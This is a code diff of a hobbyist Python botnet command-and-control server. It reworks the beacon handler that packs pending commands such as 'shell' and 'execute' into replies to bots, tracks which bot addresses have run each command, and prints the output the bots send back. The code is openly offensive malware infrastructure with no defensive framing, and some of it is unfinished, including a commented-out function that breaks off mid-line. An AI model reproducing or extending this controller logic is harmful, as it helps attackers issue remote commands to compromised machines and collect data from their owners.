@@ -6,41 +6,42 @@ from threading import Thread
 
 commands = ["get os","test","execute","shell"]
 inter = 5
-check_list = {}
+check_list = {}     #Collection of dictionaries of commands
 botnet = []
 command = ""
 has_cmd = 0 # 1 --> True 0 --> False
 
-def set_vals(n):
-    for bot in check_list:
-        check_list[bot] = n
+# def set_vals(n,name):
+#     global check_list,botnet
+#     for bot in botnet:
+#         for key in check_list:
+#             if check_list[key] =
 
 def beacon_handler(s,addr):
     global inter,command,has_cmd,check_list
     try:
-        command = command.encode()
-        # if command != "":
-        #     print(command)
-        #     command = command.encode()
-        # if has_cmd == 1:
-        #     create_checklist()
-        #     set_vals(1)
         pkt = s.recv(4096)
         len_meta_data = len(pkt) - 4
         data = struct.unpack("<HH",pkt[len_meta_data:])
         if data[0] == 1:
             if has_cmd == 1:
-                beacon_pkt = struct.pack("<%dsHH"%(len(command)),command,has_cmd,inter)
-                create_checklist()
-                set_vals(1)
-            if check_list[addr] == 1:
-                cmd_data = struct.unpack("<%ds"%(len_meta_data),pkt[:len_meta_data])
-                cmd_data = cmd_data[0].decode()
-                print(cmd_data)
-                check_list[addr] = 0
+                create_checklist(command)
+                if check_list[command][addr] != 1:
+                    beacon_pkt = struct.pack("<%dsHH"%(len(command)),command.encode(),has_cmd,inter)
+                else:
+                    beacon_pkt = struct.pack("<HH",has_cmd,inter)
+                # set_vals(1,command)
+            cmd_data = struct.unpack("<%ds"%(len_meta_data),pkt[:len_meta_data])
+            cmd_data = cmd_data[0].decode()
+            print(cmd_data)
+            check_list[command][addr] = 1
         elif data[0] == 0:
             if has_cmd == 1:
-                beacon_pkt = struct.pack("<%dsHH"%(len(command)),command,has_cmd,inter)
+                create_checklist(command)
+                if check_list[command][addr] != 1:
+                    beacon_pkt = struct.pack("<%dsHH"%(len(str(command))),command.encode(),has_cmd,inter)
+                else:
+                    beacon_pkt = struct.pack("<HH",has_cmd,inter)
             else:
                 beacon_pkt = struct.pack("<HH",has_cmd,inter)
         s.send(beacon_pkt)
@@ -49,11 +50,16 @@ def beacon_handler(s,addr):
         sys.exit(0)
     command = ""
 
-def create_checklist():
-    global botnet,check_list
-    keys = botnet
-    for key in keys:
-        check_list[key] = 0
+def create_checklist(name):
+    global botnet,check_list,command
+    command = str(command)
+    if command in check_list.keys():
+        return
+    #check_valid_command(command,return1=True) = {}
+    addr_dicts = {}
+    for bot in botnet:
+        addr_dicts[bot] = 0
+    check_list[command] = addr_dicts
 
 def check_command():
     global command,has_cmd
@@ -85,10 +91,12 @@ def start_server(ip="127.0.0.1",port=2003):
         print("[*] Error in start_server : %s"%(str(e)))
         sys.exit(0)
 
-def check_valid_command(cmd):
+def check_valid_command(cmd,return1=False):
     global commands
     for c in commands:
         if c in cmd:
+            if return1:
+                return c
             return True
     return False
 
